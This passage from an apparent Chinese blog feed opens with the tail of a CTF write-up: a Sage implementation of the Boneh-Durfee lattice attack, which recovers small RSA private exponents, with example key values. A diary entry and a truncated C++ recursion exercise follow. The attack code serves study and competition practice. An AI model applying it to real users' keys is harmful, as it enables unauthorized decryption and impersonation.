class="token operator">*</span> jj<span class="token punctuation">,</span> mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            monomials<span class="token punctuation">.</span>append<span class="token punctuation">(</span>u<span class="token operator">^</span>kk <span class="token operator">*</span> y<span class="token operator">^</span>jj<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># construct lattice B</span>    nn <span class="token operator">=</span> len<span class="token punctuation">(</span>monomials<span class="token punctuation">)</span>    BB <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> nn<span class="token punctuation">)</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span>        BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span> <span class="token keyword">in</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">=</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">.</span>monomial_coefficient<span class="token punctuation">(</span>monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># Prototype to reduce the lattice</span>    <span class="token keyword">if</span> helpful_only<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># automatically remove</span>        BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">,</span> nn<span class="token number">-1</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># reset dimension</span>        nn <span class="token operator">=</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> nn <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"failure"</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>    <span class="token comment" spellcheck="true"># check if vectors are helpful</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        helpful_vectors<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># check if determinant is correctly bounded</span>    det <span class="token operator">=</span> BB<span class="token punctuation">.</span>det<span class="token punctuation">(</span><span class="token punctuation">)</span>    bound <span class="token operator">=</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm<span class="token operator">*</span>nn<span class="token punctuation">)</span>    <span class="token keyword">if</span> det <span class="token operator">>=</span> bound<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"We do not have det &lt; bound. Solutions might not be found."</span>        <span class="token keyword">print</span> <span class="token string">"Try with highers m and t."</span>        <span class="token keyword">if</span> debug<span class="token punctuation">:</span>            diff <span class="token operator">=</span> <span class="token punctuation">(</span>log<span class="token punctuation">(</span>det<span class="token punctuation">)</span> <span class="token operator">-</span> log<span class="token punctuation">(</span>bound<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">print</span> <span class="token string">"size det(L) - size e^(m*n) = "</span><span class="token punctuation">,</span> floor<span class="token punctuation">(</span>diff<span class="token punctuation">)</span>        <span class="token keyword">if</span> strict<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)"</span>    <span class="token comment" spellcheck="true"># display the lattice basis</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        matrix_overview<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># LLL</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"optimizing basis of the lattice via LLL, this can take a long time"</span>    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"LLL is done!"</span>    <span class="token comment" spellcheck="true"># transform vector i &amp; j -> polynomials 1 &amp; 2</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"looking for independent vectors in the lattice"</span>    found_polynomials <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> pol1_idx <span class="token keyword">in</span> range<span class="token punctuation">(</span>nn <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> pol2_idx <span class="token keyword">in</span> range<span class="token punctuation">(</span>pol1_idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> nn<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># for i and j, create the two polynomials</span>            PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>w<span class="token punctuation">,</span>z<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>            pol1 <span class="token operator">=</span> pol2 <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span>                pol1 <span class="token operator">+=</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>w<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>w<span class="token punctuation">,</span>z<span class="token punctuation">)</span> <span class="token operator">*</span> BB<span class="token punctuation">[</span>pol1_idx<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">/</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>                pol2 <span class="token operator">+=</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>w<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>w<span class="token punctuation">,</span>z<span class="token punctuation">)</span> <span class="token operator">*</span> BB<span class="token punctuation">[</span>pol2_idx<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">/</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># resultant</span>            PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>q<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>            rr <span class="token operator">=</span> pol1<span class="token punctuation">.</span>resultant<span class="token punctuation">(</span>pol2<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># are these good polynomials?</span>            <span class="token keyword">if</span> rr<span class="token punctuation">.</span>is_zero<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">or</span> rr<span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"found them, using vectors"</span><span class="token punctuation">,</span> pol1_idx<span class="token punctuation">,</span> <span class="token string">"and"</span><span class="token punctuation">,</span> pol2_idx                found_polynomials <span class="token operator">=</span> <span class="token boolean">True</span>                <span class="token keyword">break</span>        <span class="token keyword">if</span> found_polynomials<span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> <span class="token operator">not</span> found_polynomials<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"no independant vectors could be found. This should very rarely happen..."</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>    rr <span class="token operator">=</span> rr<span class="token punctuation">(</span>q<span class="token punctuation">,</span> q<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># solutions</span>    soly <span class="token operator">=</span> rr<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>soly<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Your prediction (delta) is too small"</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>    soly <span class="token operator">=</span> soly<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    ss <span class="token operator">=</span> pol1<span class="token punctuation">(</span>q<span class="token punctuation">,</span> soly<span class="token punctuation">)</span>    solx <span class="token operator">=</span> ss<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token keyword">return</span> solx<span class="token punctuation">,</span> soly<span class="token keyword">def</span> <span class="token function">example</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">############################################</span>    <span class="token comment" spellcheck="true"># How To Use This Script</span>    <span class="token comment" spellcheck="true">##########################################</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># The problem to solve (edit the following values)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># the modulus</span>    N <span class="token operator">=</span> <span class="token number">0xc2fd2913bae61f845ac94e4ee1bb10d8531dda830d31bb221dac5f179a8f883f15046d7aa179aff848db2734b8f88cc73d09f35c445c74ee35b01a96eb7b0a6ad9cb9ccd6c02c3f8c55ecabb55501bb2c318a38cac2db69d510e152756054aaed064ac2a454e46d9b3b755b67b46906fbff8dd9aeca6755909333f5f81bf74db</span>    <span class="token comment" spellcheck="true"># the public exponent</span>    e <span class="token operator">=</span> <span class="token number">0x19441f679c9609f2484eb9b2658d7138252b847b2ed8ad182be7976ed57a3e441af14897ce041f3e07916445b88181c22f510150584eee4b0f776a5a487a4472a99f2ddc95efdd2b380ab4480533808b8c92e63ace57fb42bac8315fa487d03bec86d854314bc2ec4f99b192bb98710be151599d60f224114f6b33f47e357517</span>    <span class="token comment" spellcheck="true"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span>    delta <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token number">18</span> <span class="token comment" spellcheck="true"># this means that d &lt; N^delta</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Lattice (tweak those values)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span>    m <span class="token operator">=</span> <span class="token number">4</span> <span class="token comment" spellcheck="true"># size of the lattice (bigger the better/slower)</span>    <span class="token comment" spellcheck="true"># you need to be a lattice master to tweak these</span>    t <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">*</span>delta<span class="token punctuation">)</span> <span class="token operator">*</span> m<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># optimization from Herrmann and May</span>    X <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>floor<span class="token punctuation">(</span>N<span class="token operator">^</span>delta<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># this _might_ be too much</span>    Y <span class="token operator">=</span> floor<span class="token punctuation">(</span>N<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># correct if p, q are ~ same size</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Don't touch anything below</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Problem put in equation</span>    P<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token punctuation">,</span>y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>    A <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>    pol <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token punctuation">(</span>A <span class="token operator">+</span> y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Find the solutions!</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Checking bounds</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== checking values ==="</span>        <span class="token keyword">print</span> <span class="token string">"* delta:"</span><span class="token punctuation">,</span> delta        <span class="token keyword">print</span> <span class="token string">"* delta &lt; 0.292"</span><span class="token punctuation">,</span> delta <span class="token operator">&lt;</span> <span class="token number">0.292</span>        <span class="token keyword">print</span> <span class="token string">"* size of e:"</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>log<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">/</span>log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"* size of N:"</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>log<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token operator">/</span>log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"* m:"</span><span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token string">", t:"</span><span class="token punctuation">,</span> t    <span class="token comment" spellcheck="true"># boneh_durfee</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== running algorithm ==="</span>        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    solx<span class="token punctuation">,</span> soly <span class="token operator">=</span> boneh_durfee<span class="token punctuation">(</span>pol<span class="token punctuation">,</span> e<span class="token punctuation">,</span> m<span class="token punctuation">,</span> t<span class="token punctuation">,</span> X<span class="token punctuation">,</span> Y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># found a solution?</span>    <span class="token keyword">if</span> solx <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== solution found ==="</span>        <span class="token keyword">if</span> <span class="token boolean">False</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"x:"</span><span class="token punctuation">,</span> solx            <span class="token keyword">print</span> <span class="token string">"y:"</span><span class="token punctuation">,</span> soly        d <span class="token operator">=</span> int<span class="token punctuation">(</span>pol<span class="token punctuation">(</span>solx<span class="token punctuation">,</span> soly<span class="token punctuation">)</span> <span class="token operator">/</span> e<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"private key found:"</span><span class="token punctuation">,</span> d    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== no solution was found ==="</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=== %s seconds ==="</span> <span class="token operator">%</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    example<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="🎈小结"><a href="#🎈小结" class="headerlink" title="🎈小结"></a>🎈小结</h2><blockquote><p>这题很好地帮自己认识了一波RSA的各种姿势，深入地学习了一下RSA。</p></blockquote><h2 id="📕参考"><a href="#📕参考" class="headerlink" title="📕参考"></a>📕参考</h2><p><a href="http://inaz2.hatenablog.com/entry/2016/01/20/022936" target="_blank" rel="noopener">http://inaz2.hatenablog.com/entry/2016/01/20/022936</a></p><p><a href="https://github.com/mimoo/RSA-and-LLL-attacks" target="_blank" rel="noopener">https://github.com/mimoo/RSA-and-LLL-attacks</a></p><p><a href="https://cocalc.com/projects/4d6e5d25-114c-4e64-9f9a-14a88addf2e5/files/2019-05-25-224507.sagews?session=default" target="_blank" rel="noopener">https://cocalc.com/projects/4d6e5d25-114c-4e64-9f9a-14a88addf2e5/files/2019-05-25-224507.sagews?session=default</a></p><p><a href="https://www.cnblogs.com/WangAoBo/p/8654120.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/8654120.html</a></p><p><a href="https://www.cnblogs.com/WangAoBo/p/7541481.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/7541481.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一道RSA过一遍各种攻击。&lt;/p&gt;
    
    </summary>
    
      <category term="密码学" scheme="http://www.yof3ng.xyz/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="强网杯" scheme="http://www.yof3ng.xyz/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    
      <category term="RSA" scheme="http://www.yof3ng.xyz/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>New_start</title>
    <link href="http://www.yof3ng.xyz/2019/05/23/New-start/"/>
    <id>http://www.yof3ng.xyz/2019/05/23/New-start/</id>
    <published>2019-05-23T15:10:08.000Z</published>
    <updated>2019-05-23T15:22:10.123Z</updated>
    
    <content type="html"><![CDATA[<p>今天开始，回到以往的学习状态吧！🙂</p><a id="more"></a><h1 id="2019年5月23日☀"><a href="#2019年5月23日☀" class="headerlink" title="2019年5月23日☀"></a>2019年5月23日☀</h1><blockquote><p>距今很久没更新博客了，一方面因为懒，一方面因为学习的停滞，各方面原因。</p><p>而今打算回到以往的学习状态，因为只有这样，才是充实的，有规划有目标的😄。</p></blockquote><h2 id="这几个月做了什么"><a href="#这几个月做了什么" class="headerlink" title="这几个月做了什么"></a>这几个月做了什么</h2><blockquote><p>虽然认认真真地看走过来的这些日子，确实没做什么大事，做的都是实际意义不大的小事情，自己的专业知识和技能也并没有多大的进步，可以说是虚度了许多时光🙃。</p></blockquote><h2 id="时间不多了"><a href="#时间不多了" class="headerlink" title="时间不多了"></a>时间不多了</h2><blockquote><p>接下来的时间不多了，第四个学期也到了尾声，一边要准备几个比赛和项目（大多没什么意义，但也得完成它们才行），一边要期末复习，一边还得开始提升停滞许久不前的技术广度和深度。</p><p>任务艰巨，光阴珍贵，希望自己多做点有意义的事情吧💪，和身边的人共同前行，相互扶持促进，以后要多在技术方面见见世面呀。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天开始，回到以往的学习状态吧！🙂&lt;/p&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://www.yof3ng.xyz/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随笔" scheme="http://www.yof3ng.xyz/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Algorithm_Recursive_Tree</title>
    <link href="http://www.yof3ng.xyz/2019/03/17/Algorithm-Recursive-Tree/"/>
    <id>http://www.yof3ng.xyz/2019/03/17/Algorithm-Recursive-Tree/</id>
    <published>2019-03-17T08:50:11.000Z</published>
    <updated>2019-04-02T08:38:05.737Z</updated>
    
    <content type="html"><![CDATA[<p>😄算法太菜。<br><a id="more"></a></p><h1 id="Algorithm——递归思想和树"><a href="#Algorithm——递归思想和树" class="headerlink" title="Algorithm——递归思想和树"></a>Algorithm——递归思想和树</h1><h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p>借助一简单的算法程序设计题来熟悉<code>递归思想</code>和<code>简单Tree</code>.</p><pre class=" language-c++"><code class="language-c++">题面为：给一个正整数n，求有多少种非0的整数组合之和等于n.例如：    2=1+1      3=1+1+1      3=1+2</code></pre><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>通过树分支的方式来寻找答案，树的根<code>root=1</code>，然后逐渐循环获取每个分支之和为n，小于n则继续扩展。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190317161546.png" alt=""></p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span> </span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;vector></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;set></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span> tree<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">di_gui</span><span class="token punctuation">(</span><span class="token keyword">int</span> head<span class="token punctuation">,</span><span class="token keyword">int</span> result<span class="token punctuation">,</span>string treeone<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>result<span class="token operator">-</span>head<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token operator">&lt;</span>result<span class="token punctuation">)</span><span class="token punctuation">{</span>            string treetmp <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">di_gui</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token punctuation">,</span>result<span class="token punctuation">,</span>treetmp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;"dian"&lt;&lt;endl;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            string treetmp2 <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp2<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            tree<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>treetmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>            flag<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;flag&lt;&lt;endl;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>string <span class="token function">sort_string</span><span class="token punctuation">(</span>string it<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> arrchr<span class="token punctuation">[</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    string tmp <span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        arrchr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>arrchr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>arrchr<span class="token punctuation">[</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        tmp <span class="token operator">+</span><span class="token operator">=</span> arrchr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> tmp<span class="token punctuation">;</span><span class="token punctuation">}</span>set<span class="token operator">&lt;</span>string<span class="token operator">></span> <span class="token function">get_set</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span> atree<span class="token punctuation">)</span><span class="token punctuation">{</span>    set<span class="token operator">&lt;</span>string<span class="token operator">></span> tmp<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>atree<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        tmp<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token function">sort_string</span><span class="token punctuation">(</span>atree<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> tmp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span>    <span class="token keyword">int</span> head<span class="token punctuation">;</span>    cin<span class="token operator">>></span>num<span class="token punctuation">;</span>    <span class="token function">di_gui</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span>flag<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//去重处理 </span>    set<span class="token operator">&lt;</span>string<span class="token operator">></span> result <span class="token operator">=</span> <span class="token function">get_set</span><span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">auto</span> it<span class="token operator">=</span>result<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>it<span class="token operator">!=</span>result<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>it<span class="token punctuation">)</span><span class="token punctuation">{</span>        cout<span class="token operator">&lt;&lt;</span><span class="token operator">*</span>it<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token 